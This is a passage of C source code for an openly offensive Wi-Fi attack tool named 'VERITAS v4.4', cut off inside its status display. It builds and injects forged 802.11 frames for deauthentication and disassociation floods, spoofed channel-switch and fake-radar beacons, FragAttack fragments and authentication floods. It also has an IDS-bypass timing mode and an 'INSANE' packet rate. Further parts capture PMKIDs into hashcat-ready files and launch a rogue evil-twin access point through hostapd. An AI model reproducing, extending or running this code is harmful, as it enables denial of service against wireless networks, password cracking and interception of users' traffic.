/* Prefer a non-DFS redirect so vacate CSA lands on a usable channel */
static uint8_t pick_safe_ch(uint8_t cur, uint8_t preferred) {
  if (valid_ch(preferred) && !is_dfs_ch(preferred))
    return preferred;
  if (cur >= 36)
    return 36; /* UNII-1 */
  return 1;
}

/*
 * mk_dfs_radar_report — Spectrum Management Measurement Report
 *
 * Action Category 0 / Action 1 with Measurement Report IE (ID=39)
 * Basic Report Map bit 3 set → Radar Detected.
 * Addressed Client→AP so the AP processes the radar claim.
 */
static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
                               const uint8_t cli[6], uint8_t cur_ch) {
  int o = 0;
  o += mk_rt(b + o);
  /* Client → AP (addr1=BSSID, addr2=Client, addr3=BSSID) */
  o += mk_dot11(b + o, FC_ACTION, bss, cli, bss, 0);

  b[o++] = 0; /* Category: Spectrum Management */
  b[o++] = 1; /* Action: Measurement Report */
  b[o++] = 1; /* Dialog Token */

  /* Measurement Report IE (ID=39, len=15) — Basic Report + Radar map */
  b[o++] = 39; /* Element ID: Measurement Report */
  b[o++] = 15; /* Length */
  b[o++] = 1;  /* Measurement Token */
  b[o++] = 0;  /* Report Mode: success (not late/incapable/refused) */
  b[o++] = 0;  /* Measurement Type: Basic Report */
  b[o++] = cur_ch; /* Channel Number under test */

  /* Measurement Start Time (8 bytes TSF) */
  uint64_t tsf = htole64(mono_us());
  memcpy(b + o, &tsf, 8);
  o += 8;

  /* Measurement Duration (TU) */
  uint16_t dur = htole16(50);
  memcpy(b + o, &dur, 2);
  o += 2;

  /* Basic Report Map: bit3 = Radar (0x08) */
  b[o++] = 0x08;

  return o;
}

/*
 * mk_dfs_vacate_csa — Spoofed AP Channel Switch after "radar"
 *
 * Beacon from BSSID with CSA IE mode=1 (stop TX until switch),
 * count=0 (immediate). Forces clients off-channel and simulates
 * the AP's regulatory DFS vacation announcement.
 */
static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
                             uint8_t cur_ch, uint8_t safe_ch) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031); /* ESS + Spectrum Management capable */
  o += sizeof(beacon_fix_t);

  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  o += mk_ds_ie(b + o, cur_ch);

  /* CSA IE — immediate TX stop + channel vacation */
  b[o++] = 37;
  b[o++] = 3;
  csa_ie_t *c = (csa_ie_t *)(b + o);
  c->mode = 1; /* stop transmission until channel switch */
  c->ch = safe_ch;
  c->count = 0; /* switch immediately */
  o += sizeof(csa_ie_t);

  return o;
}

/* ============================================================
 *               PACKET FACTORY
 * ============================================================ */

static const uint16_t REASON_CODES[] = {1, 3, 4, 6, 7, 8, 17, 23};
#define N_REASONS 8

typedef struct {
  pkt_t csa_beacon;
  pkt_t quiet_beacon;
  pkt_t deauth_fwd[N_REASONS];
  pkt_t deauth_rev[N_REASONS];
  pkt_t deauth_bcast;
  pkt_t disassoc, disassoc_bcast;
  pkt_t eapol_logoff;
  pkt_t csa_action;
  pkt_t probe_resp;    /* unicast to client */
  pkt_t probe_resp_bc; /* [FIX 8] broadcast variant */
  pkt_t delba;
  pkt_t confusion;
  pkt_t auth_pool[MAX_AUTH_POOL];
  /* FragAttack: two-fragment pair for plaintext injection */
  pkt_t frag_setup;   /* Fragment 0: LLC/SNAP + partial ARP (MoreFrag=1) */
  pkt_t frag_payload; /* Fragment 1: injected payload tail (MoreFrag=0) */
  /* DFS Fake Radar: Measurement Report + vacate CSA pair */
  pkt_t dfs_radar_report; /* Spectrum Mgmt Measurement Report (Radar bit) */
  pkt_t dfs_vacate_csa;   /* Spoofed AP CSA beacon forcing channel vacation */
} factory_t;

/* [FIX 10] factory_build checks parse_mac returns */
static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
                          const char *cli_str) {
  uint8_t bss[6], cli[6];

  /* [FIX 10] */
  if (parse_mac(t->bssid, bss) != 0) {
    fprintf(stderr, "  " C_RED "[!] Invalid target BSSID: '%s'" RST "\n",
            t->bssid);
    return false;
  }
  if (parse_mac(cli_str, cli) != 0) {
    fprintf(stderr, "  " C_RED "[!] Invalid client MAC: '%s'" RST "\n",
            cli_str);
    return false;
  }

  uint8_t cur_ch = (uint8_t)t->channel;

  /* [FIX 6] All beacon builders now take cur_ch */
  f->csa_beacon.len =
      mk_csa_beacon(f->csa_beacon.buf, bss, t->ssid, cur_ch, (uint8_t)new_ch);
  f->quiet_beacon.len =
      mk_quiet_beacon(f->quiet_beacon.buf, bss, t->ssid, cur_ch);

  /* [FIX 11] seq=0 at build time (injector assigns real seq) */
  for (int i = 0; i < N_REASONS; i++) {
    f->deauth_fwd[i].len =
        mk_deauth(f->deauth_fwd[i].buf, bss, cli, REASON_CODES[i], 0);
    f->deauth_rev[i].len =
        mk_deauth_rev(f->deauth_rev[i].buf, bss, cli, REASON_CODES[i], 0);
  }
  f->deauth_bcast.len = mk_deauth(f->deauth_bcast.buf, bss, BCAST, 7, 0);

  f->disassoc.len = mk_disassoc(f->disassoc.buf, bss, cli, 8, 0);
  f->disassoc_bcast.len = mk_disassoc(f->disassoc_bcast.buf, bss, BCAST, 8, 0);

  f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);
  f->csa_action.len =
      mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch);

  /* [FIX 8] Probe response: unicast to client + broadcast */
  f->probe_resp.len = mk_probe_resp_csa(f->probe_resp.buf, bss, cli, t->ssid,
                                        cur_ch, (uint8_t)new_ch);
  f->probe_resp_bc.len = mk_probe_resp_csa(f->probe_resp_bc.buf, bss, BCAST,
                                           t->ssid, cur_ch, (uint8_t)new_ch);

  f->delba.len = mk_delba(f->delba.buf, bss, cli);
  f->confusion.len = mk_confusion_beacon(f->confusion.buf, t->ssid, cur_ch);

  /* FragAttack: build paired fragments with shared seq number */
  uint16_t frag_seq = 42; /* fixed seq for fragment pairing */
  f->frag_setup.len = mk_frag_setup(f->frag_setup.buf, bss, cli, frag_seq);
  f->frag_payload.len =
      mk_frag_payload(f->frag_payload.buf, bss, cli, frag_seq, NULL, 0);

  /* DFS Fake Radar: Measurement Report (radar) + vacate CSA pair */
  uint8_t safe = pick_safe_ch(cur_ch, (uint8_t)new_ch);
  f->dfs_radar_report.len =
      mk_dfs_radar_report(f->dfs_radar_report.buf, bss, cli, cur_ch);
  f->dfs_vacate_csa.len =
      mk_dfs_vacate_csa(f->dfs_vacate_csa.buf, bss, t->ssid, cur_ch, safe);

  for (int i = 0; i < MAX_AUTH_POOL; i++) {
    uint8_t fm[6];
    rand_mac(fm);
    f->auth_pool[i].len = mk_auth(f->auth_pool[i].buf, bss, fm);
  }
  return true;
}

typedef struct {
  pkt_t *p[32];
  int n;
} pkt_set_t;

/* [FIX 3] Explicit empty cases for non-injection vectors */
static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
  pkt_set_t s = {.n = 0};
  switch (v) {
  case VEC_CSA_BEACON:
    s.p[s.n++] = &f->csa_beacon;
    break;
  case VEC_QUIET_ELEMENT:
    s.p[s.n++] = &f->quiet_beacon;
    break;
  case VEC_DEAUTH_FLOOD:
    for (int i = 0; i < N_REASONS && s.n < 30; i++) {
      s.p[s.n++] = &f->deauth_fwd[i];
      s.p[s.n++] = &f->deauth_rev[i];
    }
    s.p[s.n++] = &f->deauth_bcast;
    break;
  case VEC_DISASSOC_FLOOD:
    s.p[s.n++] = &f->disassoc;
    s.p[s.n++] = &f->disassoc_bcast;
    break;
  case VEC_EAPOL_LOGOFF:
    s.p[s.n++] = &f->eapol_logoff;
    break;
  case VEC_CSA_ACTION:
    s.p[s.n++] = &f->csa_action;
    break;
  case VEC_BEACON_CONFUSION:
    s.p[s.n++] = &f->confusion;
    break;
  case VEC_PROBE_RESPONSE_CSA:
    s.p[s.n++] = &f->probe_resp;    /* unicast */
    s.p[s.n++] = &f->probe_resp_bc; /* broadcast */
    break;
  case VEC_DELBA_ATTACK:
    s.p[s.n++] = &f->delba;
    break;
  case VEC_AUTH_DOS:
    for (int i = 0; i < MAX_AUTH_POOL && s.n < 32; i++)
      s.p[s.n++] = &f->auth_pool[i];
    break;
  case VEC_FRAGATTACK:
    /* Fragment pair must be injected in order: setup → payload */
    s.p[s.n++] = &f->frag_setup;
    s.p[s.n++] = &f->frag_payload;
    break;
  case VEC_DFS_FAKE_RADAR:
    /* Radar claim first, then spoofed AP vacation CSA */
    s.p[s.n++] = &f->dfs_radar_report;
    s.p[s.n++] = &f->dfs_vacate_csa;
    break;
  /* [FIX 3] Non-injection vectors: handled by other engines */
  case VEC_PMKID_CAPTURE:
    break; /* capture thread */
  case VEC_EVIL_TWIN:
    break; /* rogue AP */
  case VEC_TKIP_MIC:
    break; /* not yet implemented */
  case VEC_POWER_SAVE:
    break; /* not yet implemented */
  case VEC_COUNT:
    break;
  }
  return s;
}

/* ============================================================
 *        RATE CONTROLLER (per-thread, rolling window)
 * ============================================================ */

/* [FIX 12,19,20] Per-thread rate controller with 1s rolling window */
typedef struct {
  attack_mode_t mode;
  int target_pps;
  double base_sleep;
  double factor;
  /* [FIX 20] Rolling window */
  uint64_t window_sent;
  double window_start;
} rate_ctrl_t;

static void rate_init(rate_ctrl_t *r, attack_mode_t m, int nthreads) {
  r->mode = m;
  r->factor = 1.0;
  r->window_sent = 0;
  r->window_start = mono_time();

  int base_pps;
  switch (m) {
  case MODE_STEALTH:
    base_pps = 20;
    r->base_sleep = 0.5;
    break;
  case MODE_LOW:
    base_pps = 50;
    r->base_sleep = 0.3;
    break;
  case MODE_MEDIUM:
    base_pps = 200;
    r->base_sleep = 0.08;
    break;
  case MODE_HIGH:
    base_pps = 500;
    r->base_sleep = 0.015;
    break;
  case MODE_INSANE:
    base_pps = 5000;
    r->base_sleep = 0.001;
    break;
  default:
    base_pps = 200;
    r->base_sleep = 0.08;
    break;
  }
  /* [FIX 19] Divide target by thread count */
  r->target_pps = nthreads > 0 ? base_pps / nthreads : base_pps;
  if (r->target_pps < 1)
    r->target_pps = 1;
}

/* [FIX 20] Rolling-window PPS measurement */
static double rate_sleep(rate_ctrl_t *r, uint64_t thread_sent) {
  double now = mono_time();
  double window_elapsed = now - r->window_start;

  /* Reset window every 1 second */
  if (window_elapsed >= 1.0) {
    r->window_sent = 0;
    r->window_start = now;
    window_elapsed = 0.001;
  }
  r->window_sent = thread_sent;

  double current_pps =
      window_elapsed > 0.01 ? (double)r->window_sent / window_elapsed : 0;
  double ratio = r->target_pps > 0 ? current_pps / r->target_pps : 1.0;

  if (ratio > 1.5) {
    r->factor *= 1.1;
    if (r->factor > 10.0)
      r->factor = 10.0;
  } else if (ratio < 0.5) {
    r->factor *= 0.9;
    if (r->factor < 0.1)
      r->factor = 0.1;
  }

  return r->base_sleep * r->factor;
}

/* ============================================================
 *               INJECTION ENGINE
 * ============================================================ */

typedef struct {
  pkt_set_t pkts;
  const char *iface;
  attack_mode_t mode;
  bool ids_bypass;
  int thread_id;
  int total_threads;
} inj_arg_t;

/* [FIX 3,5,12,13,14,15,16,17] Comprehensive injection thread */
static void *inject_thread(void *arg) {
  inj_arg_t *a = (inj_arg_t *)arg;

  /* [FIX 16] Guard empty packet set */
  if (a->pkts.n == 0) {
    free(a);
    return NULL;
  }

  /* [FIX 15] Explicit error on socket failure */
  int sock = raw_socket(a->iface);
  if (sock < 0) {
    fprintf(stderr, "  " C_RED "[!] Thread %d: socket failed for '%s'" RST "\n",
            a->thread_id, a->iface);
    free(a);
    return NULL;
  }

  /* [FIX 14] Per-thread PRNG */
  xorshift64_t rng;
  xs64_seed(&rng);

  /* [FIX 12] Per-thread rate controller */
  rate_ctrl_t rate;
  rate_init(&rate, a->mode, a->total_threads);

  uint16_t seq = 0;
  int idx = 0;
  uint64_t local_sent = 0;

  while (!g_stop) {
    int burst = xs64_range(&rng, 5, 12);

    /* [FIX 17] Batch works for any n >= 1 */
    if (!a->ids_bypass && burst >= 4) {
      pkt_t batch[BATCH_SIZE];
      int bcount = 0;
      for (int i = 0; i < burst && bcount < BATCH_SIZE; i++) {
        pkt_t *src = a->pkts.p[idx % a->pkts.n];
        memcpy(&batch[bcount], src, sizeof(pkt_t));

        /* Update sequence number */
        if (batch[bcount].len >
            (int)(sizeof(rt_hdr_t) + offsetof(dot11_t, seq) + 2)) {
          dot11_t *dot = (dot11_t *)(batch[bcount].buf + sizeof(rt_hdr_t));
          dot->seq = htole16((++seq) << 4);
        }
        bcount++;
        idx++;
      }

      int sent = inject_batch(sock, batch, bcount);
      if (sent > 0) {
        atomic_fetch_add(&g_pkts_sent, (uint64_t)sent);
        local_sent += (uint64_t)sent;
        if (sent < bcount)
          atomic_fetch_add(&g_pkts_fail, (uint64_t)(bcount - sent));
      } else {
        atomic_fetch_add(&g_pkts_fail, (uint64_t)bcount);
      }
    } else {
      for (int i = 0; i < burst && !g_stop; i++) {
        pkt_t *p = a->pkts.p[idx % a->pkts.n];
        idx++;

        uint8_t tmp[MAX_PKT_SIZE];
        memcpy(tmp, p->buf, (size_t)p->len);
        if (p->len > (int)(sizeof(rt_hdr_t) + sizeof(dot11_t))) {
          dot11_t *dot = (dot11_t *)(tmp + sizeof(rt_hdr_t));
          dot->seq = htole16((++seq) << 4);
        }

        int r = inject_one(sock, tmp, p->len);
        if (r > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          local_sent++;
        } else
          atomic_fetch_add(&g_pkts_fail, 1);

        if (a->ids_bypass) {
          double jitter = 0.0005 + (double)(xs64_next(&rng) % 1500) / 1e6;
          usleep_precise(jitter);
        }
      }
    }

    double sl = rate_sleep(&rate, local_sent);
    if (sl > 0)
      usleep_precise(sl);
  }

  close(sock);
  free(a);
  return NULL;
}

typedef struct {
  config_t *cfg;
  factory_t *fac;
  pthread_t thr[VEC_COUNT * 2];
  int nthr;
} engine_t;

static void engine_init(engine_t *e, config_t *c, factory_t *f) {
  e->cfg = c;
  e->fac = f;
  e->nthr = 0;
}

/* [FIX 13] Count threads first, then create with checked pthread_create */
static void engine_start(engine_t *e) {
  /* Count how many threads we'll need */
  int planned = 0;
  for (int v = 0; v < VEC_COUNT; v++) {
    if (!e->cfg->vec_on[v])
      continue;
    pkt_set_t ps = factory_get(e->fac, (attack_vector_t)v);
    if (ps.n == 0)
      continue;
    planned++;
    if (e->cfg->dual_radio && e->cfg->iface2[0])
      planned++;
  }
  g_total_threads = planned > 0 ? planned : 1;

  int tid = 0;
  for (int v = 0; v < VEC_COUNT; v++) {
    if (!e->cfg->vec_on[v])
      continue;
    pkt_set_t ps = factory_get(e->fac, (attack_vector_t)v);
    if (ps.n == 0)
      continue;

    inj_arg_t *a = calloc(1, sizeof(*a));
    a->pkts = ps;
    a->iface = e->cfg->iface;
    a->mode = e->cfg->mode;
    a->ids_bypass = e->cfg->ids_bypass;
    a->thread_id = tid++;
    a->total_threads = g_total_threads;

    /* [FIX 13] Check pthread_create */
    pthread_t t;
    if (pthread_create(&t, NULL, inject_thread, a) == 0) {
      e->thr[e->nthr++] = t;
    } else {
      fprintf(stderr, "  " C_YELLOW "[!] Thread create failed for %s" RST "\n",
              VEC_NAMES[v]);
      free(a);
    }

    if (e->cfg->dual_radio && e->cfg->iface2[0]) {
      inj_arg_t *a2 = calloc(1, sizeof(*a2));
      a2->pkts = ps;
      a2->iface = e->cfg->iface2;
      a2->mode = e->cfg->mode;
      a2->ids_bypass = e->cfg->ids_bypass;
      a2->thread_id = tid++;
      a2->total_threads = g_total_threads;

      pthread_t t2;
      if (pthread_create(&t2, NULL, inject_thread, a2) == 0) {
        e->thr[e->nthr++] = t2;
      } else {
        fprintf(stderr,
                "  " C_YELLOW "[!] Thread create failed (dual) for %s" RST "\n",
                VEC_NAMES[v]);
        free(a2);
      }
    }
  }
}

static void engine_stop(engine_t *e) {
  g_stop = 1;
  for (int i = 0; i < e->nthr; i++)
    pthread_join(e->thr[i], NULL);
}

/* ============================================================
 *               CHANNEL LOCKER
 * ============================================================ */

/* [FIX 33] set_ch via fork/execlp — no system() */
static int set_ch(const char *iface, int ch) {
  char ch_str[8];
  snprintf(ch_str, sizeof(ch_str), "%d", ch);

  pid_t pid = fork();
  if (pid == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 2);
      close(dn);
    }
    execlp("iw", "iw", "dev", iface, "set", "channel", ch_str, NULL);
    _exit(127);
  }
  if (pid < 0)
    return -1;

  int status;
  waitpid(pid, &status, 0);

  if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
    /* [FIX 34,45] Check for DFS/regulatory failure */
    if (is_dfs_ch(ch)) {
      fprintf(stderr,
              "  " C_YELLOW "[!] Channel %d is DFS — may require CAC" RST "\n",
              ch);
    }
    if (ch >= 149 && ch <= 165) {
      fprintf(stderr,
              "  " C_YELLOW "[!] Channel %d may be blocked by regulatory "
                            "domain (check: iw reg get)" RST "\n",
              ch);
    }
    return -1;
  }
  return 0;
}

typedef struct {
  char iface[MAX_IFACE];
  char iface2[MAX_IFACE];
  int ch;
  bool dual;
  bool rogue_on_iface2; /* [FIX: don't lock iface2 if rogue AP uses it] */
} ch_arg_t;

static void *ch_lock_thread(void *arg) {
  ch_arg_t *a = (ch_arg_t *)arg;
  while (!g_stop) {
    set_ch(a->iface, a->ch);
    /* Only lock iface2 if dual AND rogue AP is NOT using iface2 */
    if (a->dual && a->iface2[0] && !a->rogue_on_iface2)
      set_ch(a->iface2, a->ch);
    usleep_precise(1.5);
  }
  free(a);
  return NULL;
}

static pthread_t start_ch_lock(const config_t *c, int ch) {
  ch_arg_t *a = calloc(1, sizeof(*a));
  snprintf(a->iface, MAX_IFACE, "%s", c->iface);
  snprintf(a->iface2, MAX_IFACE, "%s", c->iface2);
  a->ch = ch;
  a->dual = c->dual_radio;
  a->rogue_on_iface2 = c->spawn_rogue && c->iface2[0];
  pthread_t t;
  pthread_create(&t, NULL, ch_lock_thread, a);
  return t;
}

/* ============================================================
 *               PMKID CAPTURE
 * ============================================================ */

typedef struct {
  char iface[MAX_IFACE];
  bool active;
  char target_bssid[MAX_MAC_STR];     /* [FIX 22] */
  char target_ssid[MAX_SSID_LEN + 1]; /* [FIX 25] for hashcat */
} cap_arg_t;

#ifndef PACKET_IGNORE_OUTGOING
#define PACKET_IGNORE_OUTGOING 23
#endif

static void *capture_thread(void *arg) {
  cap_arg_t *a = (cap_arg_t *)arg;
  int sock = raw_socket(a->iface);
  if (sock < 0) {
    free(a);
    return NULL;
  }

  struct timeval tv = {.tv_sec = 1};
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

  /* [FIX 21] Ignore our own outgoing packets */
  int iogo = 1;
  setsockopt(sock, SOL_PACKET, PACKET_IGNORE_OUTGOING, &iogo, sizeof(iogo));

  uint8_t target_bss[6] = {0};
  if (a->target_bssid[0])
    parse_mac(a->target_bssid, target_bss);

  uint8_t buf[4096];
  while (!g_stop) {
    ssize_t n = recv(sock, buf, sizeof(buf), 0);
    if (n <= 40 || !a->active)
      continue;

    for (ssize_t i = 0; i < n - 5; i++) {
      if (buf[i] != 0x88 || buf[i + 1] != 0x8E)
        continue;

      /* [FIX 24] Safe unaligned read for radiotap length */
      uint16_t rt_len = 0;
      memcpy(&rt_len, buf + 2, 2);
      rt_len = le16toh(rt_len);

      if (rt_len >= (uint16_t)i || rt_len + sizeof(dot11_t) > (size_t)n)
        break;

      dot11_t *d = (dot11_t *)(buf + rt_len);

      /* [FIX 22] Filter to target BSSID (a3 = BSSID in most mgmt/data) */
      char frame_bssid[MAX_MAC_STR];
      format_mac(d->a3, frame_bssid);
      if (a->target_bssid[0] && memcmp(d->a3, target_bss, 6) != 0)
        break; /* not our target */

      /* [FIX 23] Validate this is M1: check EAPOL Key Info ACK bit */
      /* EAPOL Key starts after LLC/SNAP (8 bytes) + EAPOL header (4 bytes) */
      ssize_t eapol_start = i + 2; /* past 0x888E */
      if (eapol_start + 4 + 2 < n) {
        /* Key Info is at EAPOL body offset +1 (version=1 byte, type=1, len=2,
         * then key_type=1, key_info=2) */
        /* Actually: EAPOL header is ver(1)+type(1)+len(2) = 4 bytes
           Then Key descriptor: type(1) + key_info(2) */
        ssize_t key_info_off =
            eapol_start + 4 + 1; /* past EAPOL hdr + descriptor type */
        if (key_info_off + 2 <= n) {
          uint16_t key_info;
          memcpy(&key_info, buf + key_info_off, 2);
          key_info = be16toh(key_info); /* Key Info is big-endian */
          /* M1 has ACK=1 (bit 7), MIC=0 (bit 8), Install=0 (bit 6) */
          if (!(key_info & 0x0080))
            break; /* no ACK → not M1 */
          if (key_info & 0x0100)
            break; /* MIC set → M2/M3/M4 */
        }
      }

      /* [FIX 2] Search for PMKID KDE: DD 14 00 0F AC 04 <16 bytes> */
      for (ssize_t j = i; j < n - 22; j++) {
        if (buf[j] == 0xDD && buf[j + 1] == 0x14 && buf[j + 2] == 0x00 &&
            buf[j + 3] == 0x0F && buf[j + 4] == 0xAC &&
            buf[j + 5] == 0x04) { /* [FIX 2] check KDE type */

          char pmkid_hex[33];
          for (int k = 0; k < 16 && j + 6 + k < n;
               k++) /* [FIX 2] read from j+6 */
            snprintf(pmkid_hex + k * 2, 3, "%02x", buf[j + 6 + k]);

          /* [FIX 25] Output in hashcat 22000 format */
          char ap_mac_clean[13], cli_mac_clean[13], ssid_hex[65];
          snprintf(ap_mac_clean, 13, "%02x%02x%02x%02x%02x%02x", d->a3[0],
                   d->a3[1], d->a3[2], d->a3[3], d->a3[4], d->a3[5]);
          snprintf(cli_mac_clean, 13, "%02x%02x%02x%02x%02x%02x", d->a1[0],
                   d->a1[1], d->a1[2], d->a1[3], d->a1[4], d->a1[5]);
          ssid_to_hex(a->target_ssid, ssid_hex, sizeof(ssid_hex));

          char fname[128];
          time_t now = time(NULL);
          struct tm *tm = localtime(&now);
          snprintf(fname, sizeof(fname),
                   "/tmp/veritas_pmkid_%04d%02d%02d.22000", tm->tm_year + 1900,
                   tm->tm_mon + 1, tm->tm_mday);
          FILE *fp = fopen(fname, "a");
          if (fp) {
            fprintf(fp, "WPA*01*%s*%s*%s*%s\n", pmkid_hex, ap_mac_clean,
                    cli_mac_clean, ssid_hex);
            fclose(fp);
          }
          fprintf(stderr, "  " C_GREEN "[PMKID] Captured from %s → %s" RST "\n",
                  frame_bssid, fname);
          break;
        }
      }
      break;
    }
  }
  close(sock);
  free(a);
  return NULL;
}

/* [FIX 22] Pass target info to capture thread */
static pthread_t start_capture(const config_t *c, const target_ap_t *t) {
  cap_arg_t *a = calloc(1, sizeof(*a));
  snprintf(a->iface, MAX_IFACE, "%s", c->iface);
  a->active = c->log_pmkid;
  snprintf(a->target_bssid, MAX_MAC_STR, "%s", t->bssid);
  snprintf(a->target_ssid, MAX_SSID_LEN + 1, "%s", t->ssid);
  pthread_t th;
  pthread_create(&th, NULL, capture_thread, a);
  return th;
}

/* ============================================================
 *               ROGUE AP
 * ============================================================ */

static pid_t g_rogue = -1;
static char g_rogue_iface[MAX_IFACE] = "";

/* [FIX 27,28,44] Proper rogue AP with interface mode switch and 5GHz support */
static void start_rogue(const config_t *c, const target_ap_t *t) {
  if (!c->spawn_rogue)
    return;
  char ssid[40];
  if (c->rogue_ssid[0])
    snprintf(ssid, sizeof(ssid), "%s", c->rogue_ssid);
  else
    snprintf(ssid, sizeof(ssid), "%s_5G", t->ssid);

  const char *ifc = c->iface2[0] ? c->iface2 : c->iface;
  snprintf(g_rogue_iface, MAX_IFACE, "%s", ifc);

  /* [FIX 27] Switch interface to AP mode */
  char cmd_down[128], cmd_type[128], cmd_up[128];
  snprintf(cmd_down, sizeof(cmd_down), "ip link set %s down 2>/dev/null", ifc);
  snprintf(cmd_type, sizeof(cmd_type), "iw dev %s set type __ap 2>/dev/null",
           ifc);
  snprintf(cmd_up, sizeof(cmd_up), "ip link set %s up 2>/dev/null", ifc);
  system(cmd_down);
  system(cmd_type);
  system(cmd_up);

  char path[128];
  snprintf(path, sizeof(path), "/tmp/veritas_rogue_%ld.conf", (long)time(NULL));
  FILE *fp = fopen(path, "w");
  if (!fp)
    return;

  /* [FIX 28,44] 5GHz VHT config */
  if (c->new_ch >= 36) {
    fprintf(fp,
            "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=a\nchannel=%d\n"
            "ieee80211n=1\nieee80211ac=1\n"
            "wpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\n"
            "rsn_pairwise=CCMP\n",
            ifc, ssid, c->new_ch);
  } else {
    fprintf(fp,
            "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%d\n"
            "ieee80211n=1\n"
            "wpa=2\nwpa_passphrase=password123\nwpa_key_mgmt=WPA-PSK\n"
            "rsn_pairwise=CCMP\n",
            ifc, ssid, c->new_ch);
  }
  fclose(fp);

  pid_t p = fork();
  if (p == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 1);
      dup2(dn, 2);
      close(dn);
    }
    execlp("hostapd", "hostapd", path, NULL);
    _exit(1);
  }
  if (p > 0) {
    g_rogue = p;
    fprintf(stderr, "  " C_GREEN "[✓] Rogue AP '%s' on ch %d" RST "\n", ssid,
            c->new_ch);
  }
}

/* [FIX 29] Blocking waitpid for clean zombie reap */
static void stop_rogue(const char *iface2) {
  (void)iface2;
  if (g_rogue > 0) {
    kill(g_rogue, SIGTERM);
    /* [FIX 29] Wait up to 3 seconds for clean exit */
    for (int i = 0; i < 6; i++) {
      int status;
      pid_t r = waitpid(g_rogue, &status, WNOHANG);
      if (r > 0)
        break;
      usleep_precise(0.5);
    }
    waitpid(g_rogue, NULL, 0); /* final reap */
    g_rogue = -1;

    /* Restore interface to monitor mode */
    if (g_rogue_iface[0]) {
      char cmd[128];
      snprintf(cmd, sizeof(cmd), "ip link set %s down 2>/dev/null", g_rogue_iface);
      system(cmd);
      snprintf(cmd, sizeof(cmd), "iw dev %s set type monitor 2>/dev/null",
               g_rogue_iface);
      system(cmd);
      snprintf(cmd, sizeof(cmd), "ip link set %s up 2>/dev/null", g_rogue_iface);
      system(cmd);
      g_rogue_iface[0] = '\0';
    }
  }
}

/* ============================================================
 *               DISPLAY ENGINE
 * ============================================================ */

typedef struct {
  config_t *cfg;
  target_ap_t *tgt;
  double refresh;
  char stats[MAX_PATH_LEN];
} disp_arg_t;

static void *display_thread(void *arg) {
  disp_arg_t *d = (disp_arg_t *)arg;
  double last_stats_write = 0; /* [FIX 37] throttle */

  printf("\033[?25l\033[2J\033[H");
  fflush(stdout);

  while (!g_stop) {
    double now = mono_time();
    double elapsed = now - g_start_time;
    int h = (int)(elapsed / 3600), m = (int)(fmod(elapsed, 3600) / 60),
        s = (int)(fmod(elapsed, 60));

    uint64_t sent = atomic_load(&g_pkts_sent);
    uint64_t fail = atomic_load(&g_pkts_fail);
    uint64_t total = sent + fail;
    double pps = elapsed > 0.05 ? (double)sent / elapsed : 0;
    double sc = total > 0 ? (double)sent / total * 100.0 : 100.0;

    int tw, th;
    get_term_size(&tw, &th);
    (void)tw;

    printf("\033[H");

    printf("  " C_DEEP_B "╔══════════════════════════════════════════════╗" RST
           "\n");
    printf("  ║" C_ICE BLD
           "     VERITAS v4.4 — ACTIVE SESSION          " RST C_DEEP_B "║" RST
           "\n");
    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
           "\n");
    printf("  ║ " C_GRAY "IF  " RST C_CYAN "%-40s" RST " ║\033[K\n",
           d->cfg->iface);
    printf("  ║ " C_GRAY "BSS " RST C_ICE "%-40s" RST " ║\033[K\n",
           d->tgt->bssid);
    printf("  ║ " C_GRAY "SSID" RST " " C_WHITE "%-40s" RST "║\033[K\n",
           d->tgt->ssid);
    printf("  ║ " C_GRAY "CH  " RST C_RED "%d" RST " → " C_GREEN "%d" RST
           "  " C_GRAY "MODE" RST " " C_CYAN "%s" RST
           "%s               ║\033[K\n",
           d->tgt->channel, d->cfg->new_ch, MODE_NAMES[d->cfg->mode],
           d->cfg->dual_radio ? " DUAL" : "");
    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
           "\n");

    printf("  ║ " C_GRAY "TX    " RST C_AQUA "%-12lu" RST "  " C_GRAY
           "FAIL " RST "%s%-8lu" RST "     ║\033[K\n",
           (unsigned long)sent, fail > 0 ? C_RED : C_GRAY, (unsigned long)fail);

    char pps_str[32];
    if (pps >= 1000)
      snprintf(pps_str, sizeof(pps_str), "%.1fK pps", pps / 1000);
    else
      snprintf(pps_str, sizeof(pps_str), "%.0f pps", pps);

    /* [FIX 38] Renamed from "HIT" to "TX OK" */
    printf("  ║ " C_GRAY "RATE  " RST C_ICE "%-14s" RST C_GRAY "TX OK" RST
           " %s%.1f%%" RST "       ║\033[K\n",
           pps_str, sc >= 99 ? C_GREEN : (sc >= 90 ? C_YELLOW : C_RED), sc);
    printf("  ║ " C_GRAY "TIME  " RST C_CYAN "%02d:%02d:%02d" RST
           "                                ║\033[K\n",
           h, m, s);

    printf("  " C_DEEP_B "╠══════════════════════════════════════════════╣" RST
           "\n");
    int vline = 0;
    for (int v = 0; v < VEC_COUNT && vline < th - 16; v++) {
      if (!d->cfg->vec_on[v])
        continue;
      printf("  ║ " C_GREEN "▸" RST " %-42s║\033[K\n", VEC_NAMES[v]);
      vline++;
    }
    printf("  " C_DEEP_B "╚══════════════════════════════════════════════╝" RST
           "\n");
